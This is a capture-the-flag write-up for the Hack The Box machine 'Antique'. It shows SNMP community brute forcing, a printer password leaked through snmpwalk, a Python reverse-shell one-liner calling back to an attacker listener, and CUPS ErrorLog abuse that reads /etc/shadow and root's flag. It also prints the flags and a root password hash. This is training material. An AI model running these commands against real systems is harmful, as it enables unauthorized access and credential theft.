
#Antique - Hack The Box

## Info Gathering

### Nmap scan output on TCP and UDP

> 23/tcp open telnet
> 161/udp open  snmp    SNMPv1 server (public) 

### SNMPv1 - running Nmap brute force for community string creds

> nmap -sU -p161 --script snmp-brute 10.10.11.107

>PORT    STATE         SERVICE
>161/udp open|filtered snmp
>| snmp-brute: 
>|   <empty> - Valid credentials
>|   ANYCOM - Valid credentials
>|   cascade - Valid credentials
>|   ILMI - Valid credentials
>|   TENmanUFactOryPOWER - Valid credentials
>|   volition - Valid credentials
>|   MiniAP - Valid credentials
>|   secret - Valid credentials
>|   PRIVATE - Valid credentials
>|   public - Valid credentials
>|   rmonmgmtuicommunity - Valid credentials
>|   private - Valid credentials
>|   PUBLIC - Valid credentials
>|   snmpd - Valid credentials
>|_  snmp-Trap - Valid credentials

### Enumerating using `snpwalk`

> snmpwalk -v 2c -c public 10.10.11.107

> iso.3.6.1.2.1 = STRING: "HTB Printer"

### Connecting via telnet

> telnet 10.10.11.107

<p>Telnet service was password protected</p>

### Running Hydra brute force crack on port 23 Telnet of HTB Printer

> snmpwalk -v 2c -c public 10.10.11.107 .1.3.6.1.4.1.11.2.3.9.1.1.13.0

> iso.3.6.1.4.1.11.2.3.9.1.1.13.0 = BITS: 50 40 73 73 77 30 72 64 40 31 32 33 21 21 31 32 
> 33 1 3 9 17 18 19 22 23 25 26 27 30 31 33 34 35 37 38 39 42 43 49 50 51 54 57 58 61 65 74 75 79 82 83 86 90 91 94 95 98 103 106 111 114 115 119 122 123 126 130 131 134 135 

<p>P@ssw0rd@123!!123</p>

### Crack hex dump with

> echo "504073737730726440313233212131323313917181922232526273031333435373839424349505154575861657475798283869091949598103106111114115119122123126130131134135" | xxd -p -r 

<p>P@ssw0rd@123!!123</p>

### Setup NETCAT (NC) on port 1234 and use python3 for reverse shell

> nc -lvnp 1234

> exec python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.10.14.49",1234));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn("/bin/bash")'

<p>This gains a shell as the `lp` user</p>

# User Flag

> 425b457984ab4354e104278bec3fb432

## Privilege Escalation

### Explorer running services

> netstat -ant

### Change error log location to /etc/shadow

> cupsctl ErrorLog="/etc/shadow"

### Curl the output of the error log

> curl http://localhost:631/admin/log/error_log?

<p>root:$6$UgdyXjp3KC.86MSD$sMLE6Yo9Wwt636DSE2Jhd9M5hvWoy6btMs.oYtGQp7x4iDRlGCGJg8Ge9NO84P5lzjHN1WViD3jqX/VMw4LiR.:18760:0:99999:7:::</p>

### Change error log location to /root/root.txt

> cupsctl ErrorLog="/root/root.txt"

### Curl the output of that and get the flag

<p>c616b79f6ecd6cdbb627c7bfc03456db</p>
